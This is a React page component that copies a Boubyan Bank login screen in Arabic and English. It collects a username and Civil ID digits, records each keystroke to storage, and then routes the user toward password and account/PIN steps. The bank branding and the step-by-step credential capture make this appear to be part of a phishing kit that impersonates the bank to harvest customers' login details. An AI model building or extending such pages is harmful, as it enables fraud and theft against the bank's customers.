import { useRef, useState, useEffect, useTransition } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { saveDraftApplication } from '../lib/applicationStorage'

export default function ContinueApplicationPage() {
  const { lang } = useLanguage()
  const isAr = lang === 'ar'
  const navigate = useNavigate()

  const [username, setUsername] = useState('')
  const [civilIdDigits, setCivilIdDigits] = useState(['', ''])
  const [hasError, setHasError] = useState(false)
  const [isPending, startTransition] = useTransition()
  const inputRefs = useRef([])

  useEffect(() => {
    saveDraftApplication({
      step: 'step-username',
      status: 'new',
      source: 'continue-application',
    })
  }, [])

  const handleUsernameChange = (value) => {
    const allowedValue = value.replace(/[^a-zA-Z0-9أ-يء-ي\s]/g, '')
    setUsername(allowedValue)
    
    startTransition(() => {
      saveDraftApplication({
        username: allowedValue,
        status: 'new',
        source: 'continue-application',
        step: 'step-username',
      })
    })

    if (hasError) setHasError(false)
  }

  const handleDigitChange = (index, value) => {
    const cleaned = value.replace(/\D/g, '')
    const newDigits = [...civilIdDigits]

    if (cleaned.length > 1) {
      newDigits[0] = cleaned[0] || ''
      newDigits[1] = cleaned[1] || ''
      setCivilIdDigits(newDigits)
      if (cleaned[1] && inputRefs.current[1]) {
        inputRefs.current[1].focus()
      }
    } else {
      newDigits[index] = cleaned
      setCivilIdDigits(newDigits)
      if (cleaned && index === 0 && inputRefs.current[1]) {
        inputRefs.current[1].focus()
      }
    }

    startTransition(() => {
      saveDraftApplication({
        username,
        civilId: newDigits.join(''),
        status: 'new',
        source: 'continue-application',
        step: 'step-username',
      })
    })

    if (hasError) setHasError(false)
  }

  const handleKeyDown = (index, event) => {
    if (event.key === 'Backspace') {
      const newDigits = [...civilIdDigits]
      if (newDigits[index] !== '') {
        newDigits[index] = ''
        setCivilIdDigits(newDigits)
      } else if (index > 0) {
        newDigits[index - 1] = ''
        setCivilIdDigits(newDigits)
        inputRefs.current[index - 1]?.focus()
      }
      event.preventDefault()

      startTransition(() => {
        saveDraftApplication({
          username,
          civilId: newDigits.join(''),
          status: 'new',
          source: 'continue-application',
          step: 'step-username',
        })
      })
    }
  }

  const handleNext = () => {
    const civilId = civilIdDigits.join('')
    if (!username.trim() || civilId.length < 2) {
      setHasError(true)
      return
    }

    const payload = {
      id: `app-${Date.now()}`,
      createdAt: new Date().toISOString(),
      status: 'new',
      source: 'continue-application',
      username,
      civilId,
      step: 'step-username',
    }

    saveDraftApplication(payload)
    // التوجه مباشرة لصفحة كلمة المرور حسب رغبتك
    navigate('/continue-application-step-3')
  }

  return (
    <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-4 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
      <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
        
        <div className="mb-6 sm:mb-10 flex justify-center text-center">
          <div className="h-auto w-32 sm:w-40">
            <img
              src={`${import.meta.env.BASE_URL}assets/bob.png`}
              alt="Boubyan Bank Logo"
              className="h-full w-full object-contain"
            />
          </div>
        </div>

        <div className="w-full space-y-4 sm:space-y-6">
          <div className="relative">
            <div className={`border-b pb-1.5 sm:pb-2 transition-colors ${hasError ? 'border-[#d32f2f]' : 'border-[#cccccc]'}`}>
              <input
                type="text"
                value={username}
                onChange={(e) => handleUsernameChange(e.target.value)}
                placeholder={isAr ? 'اسم المستخدم' : 'Username'}
                className="w-full bg-transparent text-right text-base sm:text-lg text-[#333333] outline-none placeholder:text-[#b0b0b0]"
              />
            </div>
            {hasError && (
              <div className="mt-1 text-right text-xs font-medium text-[#d32f2f]">
                {isAr ? 'اسم المستخدم غير صحيح' : 'Invalid username'}
              </div>
            )}
          </div>

          <div className="text-right">
            {/* عند الضغط على نسيت اسم المستخدم ينتقل لصفحة الحساب والـ PIN */}
            <button
              type="button"
              onClick={() => navigate('/continue-application-step-2')}
              className="text-xs sm:text-sm font-medium text-[#777777] hover:underline"
            >
              {isAr ? 'نسيت اسم المستخدم؟' : 'Forgot username?'}
            </button>
          </div>

          <div className="pt-1 sm:pt-2">
            <div className="mb-0.5 text-xs text-[#888888]">
              {isAr ? 'البطاقة المدنية' : 'Civil ID'}
            </div>
            <div className="mb-3 text-xs sm:text-sm text-[#777777]">
              {isAr ? 'آخر رقمين من البطاقة المدنية' : 'Last 2 digits of Civil ID'}
            </div>

            <div className="flex justify-end gap-3" dir="ltr">
              {[0, 1].map((index) => {
                const isRightBox = index === 1
                const isDisabled = isRightBox && !civilIdDigits[0]

                return (
                  <input
                    key={index}
                    type="text"
                    inputMode="numeric"
                    maxLength={2}
                    disabled={isDisabled}
                    ref={(el) => (inputRefs.current[index] = el)}
                    value={civilIdDigits[index]}
                    onChange={(e) => handleDigitChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onFocus={(event) => {
                      if (isDisabled) {
                        inputRefs.current[0]?.focus()
                      } else {
                        event.target.select()
                      }
                    }}
                    className={`w-12 h-12 text-center border-b-2 bg-transparent text-xl font-semibold outline-none transition-colors ${
                      isDisabled ? 'opacity-40 cursor-not-allowed border-[#cccccc]' : 'border-[#b0b0b0] focus:border-[#ce1126] text-[#333333]'
                    }`}
                    style={{ direction: 'ltr' }}
                  />
                )
              })}
            </div>
          </div>

          <button
            type="button"
            onClick={handleNext}
            className="mt-6 sm:mt-8 w-full rounded-[22px] bg-[#d32f2f] px-6 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-white shadow-[0_10px_25px_rgba(211,47,47,0.35)] transition hover:brightness-105"
          >
            {isAr ? 'التالي' : 'Next'}
          </button>
        </div>
      </div>
    </section>
  )
}